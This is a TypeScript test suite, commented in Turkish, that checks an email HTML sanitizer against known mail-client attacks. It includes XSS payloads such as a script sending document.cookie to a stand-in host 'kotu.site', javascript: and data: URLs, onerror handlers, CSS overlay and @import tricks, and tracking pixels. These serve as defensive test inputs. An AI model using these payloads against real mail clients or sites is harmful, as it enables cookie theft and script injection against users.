/**
 * Sanitizer için saldırı testleri.
 * Çalıştır: npx tsx src/mail/sanitize.test.ts
 *
 * Buradaki her vaka, gerçek dünyada posta istemcilerinde görülmüş
 * bir saldırı biçimine karşılık geliyor.
 */
import { sanitizeEmailHtml, plainTextToHtml } from "./sanitize.js";

let passed = 0;
let failed = 0;

function check(name: string, cond: boolean, extra = "") {
  if (cond) {
    passed += 1;
    console.log(`  ✓ ${name}`);
  } else {
    failed += 1;
    console.log(`  ✗ ${name}${extra ? `\n      ${extra}` : ""}`);
  }
}

console.log("\nGelen mail HTML'i — saldırı testleri\n");

// 1) Script çalıştırma
{
  const out = sanitizeEmailHtml(`<p>merhaba</p><script>fetch('//kotu.site?c='+document.cookie)</script>`);
  check("<script> tamamen atılıyor", !/script|fetch|document\.cookie/i.test(out.html), out.html);
}

// 2) javascript: URL
{
  const out = sanitizeEmailHtml(`<a href="javascript:alert(1)">tıkla</a>`);
  check("javascript: linki eleniyor", !/javascript:/i.test(out.html), out.html);
}

// 3) Inline event handler
{
  const out = sanitizeEmailHtml(`<img src="x" onerror="alert(document.domain)">`);
  check("onerror gibi handler'lar atılıyor", !/onerror|alert/i.test(out.html), out.html);
}

// 4) iframe / form / object
{
  const out = sanitizeEmailHtml(
    `<iframe src="//kotu.site"></iframe><form action="//kotu.site"><input name="p"></form><object data="x"></object>`,
  );
  check("iframe/form/object atılıyor", !/(iframe|form|object|input)/i.test(out.html), out.html);
}

// 5) Uzak görsel = takip pikseli
{
  const out = sanitizeEmailHtml(`<img src="https://takip.site/piksel.gif?id=42" width="1" height="1">`);
  check("uzak görsel varsayılan engelli", out.blockedImages === 1, `blockedImages=${out.blockedImages}`);
  check("orijinal adres data-blocked-src'de saklı", /data-blocked-src/.test(out.html), out.html);
  check("gerçek istek atılmıyor (src placeholder)", !/takip\.site/.test(out.html.split("data-blocked-src")[0] ?? ""), out.html);
}

// 6) Kullanıcı izin verirse görsel geçer
{
  const out = sanitizeEmailHtml(`<img src="https://ornek.site/a.png">`, { allowRemoteImages: true });
  check("izin verilince uzak görsel yükleniyor", out.blockedImages === 0 && /ornek\.site/.test(out.html), out.html);
}

// 7) Link güvenliği
{
  const out = sanitizeEmailHtml(`<a href="https://baska.site/giris">bankan</a>`);
  check("dış linkte noopener var", /rel="[^"]*noopener/.test(out.html), out.html);
  check("dış link sayılıyor (phishing uyarısı için)", out.externalLinks === 1, `externalLinks=${out.externalLinks}`);
}

// 8) CSS ile sayfa üstüne bindirme (clickjacking)
{
  const out = sanitizeEmailHtml(`<div style="position:fixed;top:0;left:0;z-index:9999;width:100vw">kapla</div>`);
  check("position/z-index style'ı eleniyor", !/position|z-index/i.test(out.html), out.html);
}

// 9) style/link etiketiyle CSS enjeksiyonu
{
  const out = sanitizeEmailHtml(`<style>body{display:none}</style><link rel="stylesheet" href="//kotu.site/a.css">`);
  check("<link> atılıyor", !/(<link|kotu\.site)/i.test(out.html), out.html);
}

// 9b) <style> kalıyor ama dış kaynak ve bindirme temizleniyor
{
  const out = sanitizeEmailHtml(`<style>@import url(https://kotu.site/a.css);.x{background:url(http://takip.site/p.gif);position:fixed;z-index:9;color:red}.y{width:expression(alert(1))}</style><p class="x">a</p>`);
  check("<style> içinde @import yok", !/@import|kotu\.site/i.test(out.html), out.html);
  check("<style> içinde http url() yok", !/takip\.site/i.test(out.html), out.html);
  check("<style> içinde position/z-index yok", !/position|z-index/i.test(out.html), out.html);
  check("<style> içinde expression yok", !/expression/i.test(out.html), out.html);
  check("zararsız kural ve class kalıyor", /color:red/.test(out.html) && /class="x"/.test(out.html), out.html);
}

// 9c) Mail tasarımı için gereken düzen stilleri kalıyor, url()/expression süzülüyor
{
  const out = sanitizeEmailHtml(
    `<div style="display:none;max-height:0">gizli</div>` +
    `<a style="background-color:#2bb3ff;border-radius:8px;padding:12px 20px;display:inline-block" href="https://a.b">Al</a>` +
    `<td bgcolor="#ffffff" align="center" width="600" style="width:600px;border:1px solid #ddd;background:url(javascript:alert(1))">x</td>` +
    `<div style="background-image:url(https://ornek.site/a.png);width:expression(alert(1))">y</div>`,
  );
  check("display:none korunuyor (gizli önizleme metni)", /display:none/.test(out.html), out.html);
  check("düğme stili korunuyor", /border-radius:8px/.test(out.html) && /background-color:#2bb3ff/.test(out.html), out.html);
  check("bgcolor/align/width korunuyor", /bgcolor="#ffffff"/.test(out.html) && /width="600"/.test(out.html), out.html);
  check("javascript: url'li background atılıyor", !/javascript/i.test(out.html), out.html);
  check("https arka plan görseli kalıyor", /background-image:url\(https:\/\/ornek\.site/.test(out.html), out.html);
  check("expression atılıyor", !/expression/i.test(out.html), out.html);
}

// 10) data: URL ile script
{
  const out = sanitizeEmailHtml(`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">aç</a>`);
  check("data: linki eleniyor", !/data:text\/html/i.test(out.html), out.html);
}

// 11) Meşru içerik korunuyor
{
  const out = sanitizeEmailHtml(
    `<h2>Başlık</h2><p><strong>Kalın</strong> ve <em>eğik</em>.</p><ul><li>bir</li><li>iki</li></ul><table><tr><td>hücre</td></tr></table>`,
  );
  check(
    "normal biçimlendirme bozulmuyor",
    /<h2>/.test(out.html) && /<strong>/.test(out.html) && /<li>/.test(out.html) && /<td>/.test(out.html),
    out.html,
  );
}

// 12) Düz metin yolu
{
  const out = plainTextToHtml(`<script>alert(1)</script>\nhttps://ornek.site adresine bak`);
  check("düz metinde HTML kaçışı yapılıyor", !/<script>/.test(out) && /&lt;script&gt;/.test(out), out);
  check("düz metindeki link güvenli <a> oluyor", /rel="noopener/.test(out), out);
}

console.log(`\nSonuç: ${passed} geçti, ${failed} kaldı\n`);
process.exit(failed === 0 ? 0 : 1);
